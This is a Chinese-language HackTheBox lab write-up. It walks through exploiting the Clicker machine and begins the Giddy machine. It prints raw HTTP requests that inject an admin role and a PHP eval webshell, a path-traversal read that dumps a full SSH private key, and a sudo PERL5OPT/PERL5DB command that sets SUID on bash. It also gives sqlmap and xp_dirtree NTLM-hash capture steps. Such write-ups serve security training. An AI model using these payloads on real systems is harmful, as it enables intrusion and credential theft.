尝试访问80端口 发现跳转至 http://clicker.htb/ 修改hosts文件 vim /etc/hosts 漏洞探测80 端口乱打一通，没发现可利用点，根据 nmap 扫描结果，先行查看 2049 端口NFS服务 NFS（Network File System）是一种分布式文件系统协议，允许计算机通过网络共享文件和目录。NFS最初由Sun Microsystems开发，用于在UNIX和类UNIX系统之间实现文件共享。它是基于客户端-服务器模型的，其中文件存储在服务器上，并通过网络提供给客户端进行访问。客户端可以远程挂载服务器上的文件系统，使得这些文件在客户端上就像本地文件一样可用。NFS使用RPC（Remote Procedure Call）机制进行通信。客户端发送请求到服务器，并且服务器返回请求的文件或目录。NFS支持读、写、创建、删除等文件操作，并提供文件锁定机制以确保并发访问的一致性。 NFS文件共享漏洞 参考文章：6-19漏洞利用-nfs获取目标密码文件_nfs漏洞利用-CSDN博客，nfs文件共享漏洞_nfs漏洞-CSDN博客 showmount -e 10.129.47.107mount -t nfs 10.129.47.107:/mnt/backups /root/桌面/nfs -o nolock 解压查看备份源码 发现突破点出现在save_game.php 该代码是一个 PHP 页面，用于保存用户在游戏中的个人资料并更新会话信息。 首先，它使用了 session_start() 函数来启动一个会话，并根据是否设置了 SESSION[‘PLAYER’] 并且其不为空，判断用户是否已经登录。如果用户已经登录，则获取 GET 请求参数并调用 save_profile() 函数，将用户的游戏信息保存到数据库中。注意在获取 GET 请求参数时，代码对参数列表进行了遍历，并在其中查找“role”参数，以防止恶意用户通过修改“role”参数来实现非法操作。但是它没有对用户输入进行任何过滤和验证，使得恶意用户可以通过在 GET 请求中传递恶意参数来攻击系统。然后，代码更新了会话信息，包括用户的点击数和等级，并通过 header() 函数将用户重定向回主页，并带上一个消息提示。 根据 admin.php 文件中 if 语句可知 如果 SESSION[“ROLE”] 的值不等于 “Admin”，也就是用户不是管理员，那么代码会使用 header() 函数将用户重定向回主页，并终止脚本的执行。 于是可以尝试在 save_game.php 提交参数时插入 roleAdmin 来赋予当前账户管理员权限。 漏洞利用注册任意账户并登录 http://clicker.htb/play.php 尝试直接拼接，显示 检测到恶意活动! 尝试绕过它 CRLF注入：每日漏洞 | CRLF注入 - FreeBuf网络安全行业门户 使用 %0a 或 %0d 均可GET /save_game.php?clicks=0level=1role%0d=Admin HTTP/1.1Host: clicker.htbUser-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeReferer: http://clicker.htb/play.phpCookie: PHPSESSID=sufjgvlfjcdiqk7fn7o7enn5g7Upgrade-Insecure-Requests: 1GET /save_game.php?clicks=0level=1role%0a=Admin HTTP/1.1Host: clicker.htbUser-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeReferer: http://clicker.htb/play.phpCookie: PHPSESSID=sufjgvlfjcdiqk7fn7o7enn5g7Upgrade-Insecure-Requests: 1 注销登录并重新登录，当前已是管理员权限 此处有一导出功能，支持 txt，josn，html 方式 尝试抓包修改为 php，可行，尝试内容写马生成 php 文件 查看 export.php 可以通过控制当前用户的 Nickname，Clicks， Level 来控制生成文件的内容 Nickname即为注册时的用户名，尝试重新注册直接写 php 代码，提示不允许输入特殊字符，pass save_game.php 提交参数时可以插入数据，尝试在 save_game.php 处修改Nickname进行参数覆盖 写入 PHP 一句话木马 GET /save_game.php?clicks=99999999level=1Nickname=?php+eval($_POST[hacker]);+?role%0a=Admin HTTP/1.1Host: clicker.htbUser-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeReferer: http://clicker.htb/play.phpCookie: PHPSESSID=sufjgvlfjcdiqk7fn7o7enn5g7Upgrade-Insecure-Requests: 1 在 http://clicker.htb/admin.php 导出为 php 文件 因为靶机一会清理一下数据文件，msf 反弹一个 shell稳定一下 权限提升suid 提权 Linux下SUID提权方法_linux suid提权_~Echo的博客-CSDN博客 使用二进制文件执行以下任务: —1:创建数据库结构，并添加admin用户 - 2:制造假玩家(最好不要告诉任何人) —3:重置admin密码 —4:删除除admin以外的所有用户 尝试运行一下 .execute_query 1 ，它好像把 SQL 脚本运行并读取回显出来了 strace跟踪一下看看 strace ./execute_query 1execve(./execute_query, [./execute_query, 1], 0x7fff84480298 /* 13 vars */) = 0access(/etc/suid-debug, F_OK) = -1 ENOENT (No such file or directory)brk(NULL) = 0x55a24a765000File not readable or not foundarch_prctl(0x3001 /* ARCH_??? */, 0x7fffe69032d0) = -1 EINVAL (Invalid argument)fcntl(0, F_GETFD) = 0fcntl(1, F_GETFD) = 0fcntl(2, F_GETFD) = 0access(/etc/suid-debug, F_OK) = -1 ENOENT (No such file or directory)mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffb09b2c000access(/etc/ld.so.preload, R_OK) = -1 ENOENT (No such file or directory)openat(AT_FDCWD, /etc/ld.so.cache, O_RDONLY|O_CLOEXEC) = 3newfstatat(3, , st_mode=S_IFREG|0644, st_size=21007, ..., AT_EMPTY_PATH) = 0mmap(NULL, 21007, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffb09b26000close(3) = 0openat(AT_FDCWD, /lib/x86_64-linux-gnu/libc.so.6, O_RDONLY|O_CLOEXEC) = 3read(3, \\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\0\\1\\0\\0\\0P\\237\\2\\0\\0\\0\\0\\0..., 832) = 832pread64(3, \\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0..., 784, 64) = 784pread64(3, \\4\\0\\0\\0 \\0\\0\\0\\5\\0\\0\\0GNU\\0\\2\\0\\0\\300\\4\\0\\0\\0\\3\\0\\0\\0\\0\\0\\0\\0..., 48, 848) = 48pread64(3, \\4\\0\\0\\0\\24\\0\\0\\0\\3\\0\\0\\0GNU\\0\\\\233\\305\\t\\5?\\344\\337^)\\350b\\231\\21\\360..., 68, 896) = 68newfstatat(3, , st_mode=S_IFREG|0755, st_size=2216304, ..., AT_EMPTY_PATH) = 0pread64(3, \\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0..., 784, 64) = 784mmap(NULL, 2260560, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffb098fe000mmap(0x7ffb09926000, 1658880, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7ffb09926000mmap(0x7ffb09abb000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bd000) = 0x7ffb09abb000mmap(0x7ffb09b13000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x214000) = 0x7ffb09b13000mmap(0x7ffb09b19000, 52816, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffb09b19000close(3) = 0mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffb098fb000arch_prctl(ARCH_SET_FS, 0x7ffb098fb740) = 0set_tid_address(0x7ffb098fba10) = 2703set_robust_list(0x7ffb098fba20, 24) = 0rseq(0x7ffb098fc0e0, 0x20, 0, 0x53053053) = 0mprotect(0x7ffb09b13000, 16384, PROT_READ) = 0mprotect(0x55a249dd2000, 4096, PROT_READ) = 0mprotect(0x7ffb09b66000, 8192, PROT_READ) = 0prlimit64(0, RLIMIT_STACK, NULL, rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY) = 0munmap(0x7ffb09b26000, 21007) = 0getrandom(\\x5a\\xbd\\x67\\xef\\xdc\\xeb\\x94\\xd9, 8, GRND_NONBLOCK) = 8brk(NULL) = 0x55a24a765000brk(0x55a24a786000) = 0x55a24a786000setreuid(1000, 1000) = -1 EPERM (Operation not permitted)access(/home/jack/queries/create.sql, R_OK) = -1 EACCES (Permission denied)newfstatat(1, , st_mode=S_IFIFO|0600, st_size=0, ..., AT_EMPTY_PATH) = 0write(1, File not readable or not found , 31) = 31exit_group(0) = ?+++ exited with 0 +++ 这段输出是使用strace命令跟踪执行一个名为”execute_query”的程序时的结果。strace用于追踪和记录程序执行期间的系统调用和信号。 根据输出，我们可以得到一些信息： 程序通过execve函数加载并执行了”.execute_query”。 程序尝试访问了”etcsuid-debug”文件，但返回了”ENOENT”错误，表示该文件不存在。 程序调用了一系列的fcntl、mmap、openat系统调用，用于加载动态链接库和其他相关资源。 程序尝试访问了”etcld.so.preload”和”etcld.so.cache”文件，但都返回了”ENOENT”错误，表示这些文件不存在。 程序加载了”libx86_64-linux-gnulibc.so.6”动态链接库。 程序对内存进行了一些操作，如mmap和mprotect，用于分配和保护内存区域。 程序调用了setreuid函数，并返回了”EPERM”错误，表示当前用户没有权限进行该操作。 程序尝试访问”homejackqueriescreate.sql”文件，但返回了”EACCES”错误，表示没有读取该文件的权限。 程序在标准输出上打印了”File not readable or not found”。 程序通过exit_group函数正常退出，返回值为0。 分别starace执行 1，2，3，4 参数，发现都是访问 SQL 脚本 执行一下，证明猜想 运行并读取了 SQL 脚本 参数 1，2，3，4都指定了路径 一顿跟踪尝试，发现需要两个参数 第一个参数是一个大于4的数字 第二个参数是指定要执行的sql语句的文件位置 因为目前我们的位置在 homejackquery 需要三个..来跳出目录 strace ./execute_query 5 ../../../etc/passwdexecve(./execute_query, [./execute_query, 5, ../../../etc/passwd], 0x7ffccb61acf0 /* 13 vars */) = 0access(/etc/suid-debug, F_OK) = -1 ENOENT (No such file or directory)brk(NULL) = 0x55a5dbdcf000arch_prctl(0x3001 /* ARCH_??? */, 0x7fffa7d41040) = -1 EINVAL (Invalid argument)fcntl(0, F_GETFD) = 0fcntl(1, F_GETFD) = 0fcntl(2, F_GETFD) = 0access(/etc/suid-debug, F_OK) = -1 ENOENT (No such file or directory)mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ff30be71000access(/etc/ld.so.preload, R_OK) = -1 ENOENT (No such file or directory)openat(AT_FDCWD, /etc/ld.so.cache, O_RDONLY|O_CLOEXEC) = 3newfstatat(3, , st_mode=S_IFREG|0644, st_size=21007, ..., AT_EMPTY_PATH) = 0mmap(NULL, 21007, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ff30be6b000close(3) = 0openat(AT_FDCWD, /lib/x86_64-linux-gnu/libc.so.6, O_RDONLY|O_CLOEXEC) = 3read(3, \\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\0\\1\\0\\0\\0P\\237\\2\\0\\0\\0\\0\\0..., 832) = 832pread64(3, \\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0..., 784, 64) = 784pread64(3, \\4\\0\\0\\0 \\0\\0\\0\\5\\0\\0\\0GNU\\0\\2\\0\\0\\300\\4\\0\\0\\0\\3\\0\\0\\0\\0\\0\\0\\0..., 48, 848) = 48pread64(3, \\4\\0\\0\\0\\24\\0\\0\\0\\3\\0\\0\\0GNU\\0\\\\233\\305\\t\\5?\\344\\337^)\\350b\\231\\21\\360..., 68, 896) = 68newfstatat(3, , st_mode=S_IFREG|0755, st_size=2216304, ..., AT_EMPTY_PATH) = 0pread64(3, \\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0..., 784, 64) = 784mmap(NULL, 2260560, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ff30bc43000mmap(0x7ff30bc6b000, 1658880, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7ff30bc6b000mmap(0x7ff30be00000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bd000) = 0x7ff30be00000mmap(0x7ff30be58000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x214000) = 0x7ff30be58000mmap(0x7ff30be5e000, 52816, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ff30be5e000close(3) = 0mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ff30bc40000arch_prctl(ARCH_SET_FS, 0x7ff30bc40740) = 0set_tid_address(0x7ff30bc40a10) = 2872set_robust_list(0x7ff30bc40a20, 24) = 0rseq(0x7ff30bc410e0, 0x20, 0, 0x53053053) = 0mprotect(0x7ff30be58000, 16384, PROT_READ) = 0mprotect(0x55a5db366000, 4096, PROT_READ) = 0mprotect(0x7ff30beab000, 8192, PROT_READ) = 0prlimit64(0, RLIMIT_STACK, NULL, rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY) = 0munmap(0x7ff30be6b000, 21007) = 0getrandom(\\x03\\x30\\x24\\x82\\x73\\x39\\x44\\x6d, 8, GRND_NONBLOCK) = 8brk(NULL) = 0x55a5dbdcf000brk(0x55a5dbdf0000) = 0x55a5dbdf0000setreuid(1000, 1000) = -1 EPERM (Operation not permitted)access(/home/jack/queries/../../../etc/passwd, R_OK) = -1 EACCES (Permission denied)newfstatat(1, , st_mode=S_IFIFO|0600, st_size=0, ..., AT_EMPTY_PATH) = 0File not readable or not foundwrite(1, File not readable or not found , 31) = 31exit_group(0) = ?+++ exited with 0 +++ 尝试读取 jack用户私钥文件 ./execute_query 5 ../.ssh/id_rsamysql: [Warning] Using a password on the command line interface can be insecure.-------------------BEGIN OPENSSH PRIVATE KEY----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-----END OPENSSH PRIVATE KEY------------------ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near -----BEGIN OPENSSH PRIVATE KEY---b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA at line 1 保存到本地连接 ssh，记得补齐- -----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY----- 给文件一个 600 权限，登录 ssh chmod 600 id_rsassh -i id_rsa jack@10.10.11.232 找到第一个 flag:5fdd6314e0fb12c8713770039cf6bad7 sudo -l 检查当前用户在sudo配置中被授权执行哪些命令。cd /opt 将当前工作目录更改为/opt。ls -al 列出/opt目录中的所有文件和子目录，并显示它们的详细信息，包括权限、所有者和修改日期等。cat monitor.sh 输出名为monitor.sh的文件的内容 sudo -l 获取到的一些信息 任意命令执行：用户jack可以以任意身份运行任何命令。SETENV特权：用户jack可以使用SETENV特权设置环境变量，而无需输入密码。NOPASSWD特权：用户jack以root用户身份执行/opt/monitor.sh脚本时，不需要输入密码。 monitor.sh这段脚本是一个Bash脚本，用于执行一系列操作并保存诊断数据到文件中。 首先，它检查当前用户的EUID（Effective User ID），如果不是0（即不是root用户），则输出错误信息并退出脚本。 接下来，它设置了PATH环境变量，指定了一组路径，以确保可以找到所需的命令和程序。 然后，它使用curl命令获取一个URL（http://clicker.htb/diagnostic.php?token=secret_diagnostic_token）返回的数据，并将结果存储在变量$data中。 接着，它使用xml_pp对$data进行格式化，然后输出到屏幕上。 如果变量$NOSAVE的值为”true”，则脚本直接退出。 否则，它使用date命令获取当前时间戳，并将data的内容保存到rootdiagnostic_filesdiagnostic_{timestamp}.xml文件中。 查看 xml_pp CVE 2016-1531提权 sudo PERL5OPT=-d PERL5DB=exec ls /root /opt/monitor.shsudo PERL5OPT=-d PERL5DB=exec cat /root/root.txt /opt/monitor.shsudo PERL5OPT=-d PERL5DB=exec chmod u+s /bin/bash /opt/monitor.shbash -p 拿到第二个 flag:635e217dd41a18dae7f1843b7d5509c6","tags":["HackTheBox"],"categories":["笔记","靶场日记","HackTheBox"]},{"title":"Giddy_Medium","path":"/2023/10/17/Giddy_Medium/","content":"Giddy_Medium信息收集namp：--min-rate 10000 10000速率来扫描-p- 全端口-p80,135 指定80，135端口扫描-sU 指定udp扫描-sT 指定tcp协议-sV 扫描服务版本-sC 默认脚本扫描-O 对操作系统和版本探测--script=vuln 进行基础漏洞扫描nmap -p- --min-rate 10000 10.129.96.140nmap -p- -sU --min-rate 10000 10.129.96.140nmap -p80,443,3389,5985 -sV -sC -sT -O 10.129.96.140nmap -p80,443,3389,5985 --script=vuln 10.129.96.140 扫描端口发现其开放 80，443，3389，5985端口 有用的一些信息为： 关于远程桌面协议（RDP）的NTLM认证信息Target_Name: GIDDY：目标的名称是GIDDY。NetBIOS_Domain_Name: GIDDY：在NetBIOS中，目标的域名是GIDDY。NetBIOS_Computer_Name: GIDDY：在NetBIOS中，目标计算机的名称是GIDDY。DNS_Domain_Name: Giddy：在DNS中，目标的域名是Giddy。DNS_Computer_Name: Giddy：在DNS中，目标计算机的名称是Giddy。Product_Version: 10.0.14393：目标系统的产品版本是 10.0.14393 访问80443页面均为小狗图片，无功能点，使用dirsearch扫描路径 python3 dirsearch.py -r -u https://10.129.96.140/ 获取到的有效目录为 https://10.129.96.140/mvc/https://10.129.96.140/Remote/en-US/logon.aspx?ReturnUrl=%2fremote%2flogin 一个购物页面 一个web端的powershell登录页面 漏洞探测在 https://10.129.96.140/mvc/ 页面发现多处SQL注入漏洞 如：https://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=24 经典的单引号报错 放进sqlmap sqlmap -u https://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=24 --batch --is-dba --dbs--batch 告诉sqlmap以批处理模式运行，即自动化执行所有的测试和攻击步骤，而无需用户交互。这对于批量测试多个目标非常有用。--is-dba\t用于检测当前用户是否具有数据库管理员（DBA）权限。如果当前用户是DBA，sqlmap将使用更强大的技术和攻击方法来探测和利用漏洞。--dbs 用于获取目标数据库服务器上的所有可用数据库列表。sqlmap将尝试枚举并列出目标服务器上的数据库名称。 得到的信息为： 目标网站存在注入为：布尔型盲注，内联查询注入，报错型注入，时间型盲注，UNION 查询注入，堆叠注入。不具有数据库管理员（DBA）权限 目标网站使用的后端数据库管理系统（DBMS）是Microsoft SQL Server 2016 目标网站的操作系统可能是Windows 2022、Windows 10、Windows 2016、Windows 2019或Windows 11 目标网站使用的Web应用技术是ASP.NET，Web服务器是Microsoft IIS 10.0，ASP.NET的版本是4.0.30319 发现5个可用的数据库，它们分别是：Injection，master，model，msdb，tempdb 漏洞利用将数据库dump出来查看，无可用信息。 通过mssql 堆叠注入，利用函数 xp_dirtree + UNC 可以触发 NTLM 认证，带出服务器的 NET-NTLM hash 这里参考了三篇文章：mssql堆叠注入利用总结，[域渗透] SQLSERVER 结合中继与委派,How to Use xp_dirtree to List All Files in a Folder – Everyday SQL 提到的几个概念:xp_dirtree是SQL Server中的一个存储过程，它可以返回一个目录及其子目录中所有文件的列表。它可以用来访问本地或远程系统上的文件。UNC是Universal Naming Convention的简称，它是一种用于指定网络资源的方式，如\\\\server\\share\\path\\file。NTLM是Microsoft Windows平台上的一种身份验证协议。NET-NTLM hash是NTLM协议中使用的一种密码哈希。关于如何使用xp_dirtree和UNC来触发NTLM认证，从而获取服务器的NET-NTLM hash。这是一种攻击技术，通常称为NTLM Relay 